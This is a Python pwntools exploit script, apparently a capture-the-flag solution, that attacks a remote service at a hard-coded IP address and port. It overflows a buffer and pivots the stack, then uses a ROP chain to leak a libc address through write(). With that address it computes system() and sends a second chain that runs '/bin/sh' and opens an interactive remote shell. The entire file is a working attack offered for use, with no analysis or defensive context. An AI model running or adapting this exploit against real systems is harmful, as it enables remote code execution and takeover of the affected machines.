from pwn import *
import time

s = remote('1.224.175.11' ,10010)
# s = remote('192.168.56.102', 31337)
# raw_input(">")
system_offset = 0x40310
binsh_offset = 0x16084c

write_plt = 0x80488f0
read_plt = 0x8048940
write_got = 0x804d028
main_plt = 0x804a241
puts_plt = 0x80489f0
printf_plt = 0x8048960
puts_got = 0x804d068
ppr = 0x8048dc2
intro = 0x804d16c   #1. puts_plt main got 3. system AAAA binsh
leave_ret = 0x8048ad8
pppr = 0x8048dc1
ret = 0x8048dc4

id_ = 'A'*9
pw_ = ''

modify  = p32(0x804d07c + 26 - 3)
modify += p32(0x80491ba)
modify += p32(0xffffffff)
modify += p32(0xffffffff)

payload  = 'no\x00'.ljust(52)
payload += p32(0x804d040 + 26)   #2. sfp : fake ebp
payload += p32(0x80491c2)

#s.recv(1024)
s.recvuntil('select : ')
s.send('2\n')
#s.recv(1024)
print s.recv(1024)
log.info("id input: ")
s.send(id_ + '\n')
print s.recv(1024)
log.info("pw input: ")
s.send(pw_ + '\n')
s.recv(1024)
print s.recv(1024)
s.send('\n')
s.recv(1024)
print s.recv(1024)
s.send('7\n')   #intro
s.recv(1024)
print s.recv(1024)
s.send(pw_ + '\n')
print s.recv(1024)
s.send(pw_ + '\n')
print s.recv(1024)
s.send(modify + '\n')
print s.recv(1024)
s.send('no\n')
sleep(0.3)
s.send('\n')
s.recv(1024)
print s.recv(1024)
s.send('5\n')   #vuln
s.recv(1024)
print s.recv(1024)
s.send('yes\n')

print s.recv(1024)
s.send(payload + '\n')
print s.recv(1024)
s.recvuntil('yes or no) : ')
s.send('no\n')
time.sleep(1)
cmd = 'sh'
write_len = 0xc00
rop = p32(leave_ret) + cmd.ljust(22, '\x00') + p32(0x804d040 + 26) + p32(write_plt) + p32(0x80491c2) + p32(1) + p32(0x804d030) + p32(write_len)
rop = rop.ljust(0x3c)
s.send(rop)
data = s.recvn(write_len)
print `data`
fgets = u32(data[:4])
libc_base = fgets - 0x63ca0
system = libc_base + 0x40310
time.sleep(1)
print hex(fgets)
print hex(libc_base)
print len(rop)
rop = p32(0x81818181) + 'aa' + p32(ret) * 0x100 + p32(system) + p32(0) + p32(0x804d040 + 0x412) + '/bin/sh\x00'
print len(rop) < write_len
print len(rop)
s.send(rop)
s.interactive()
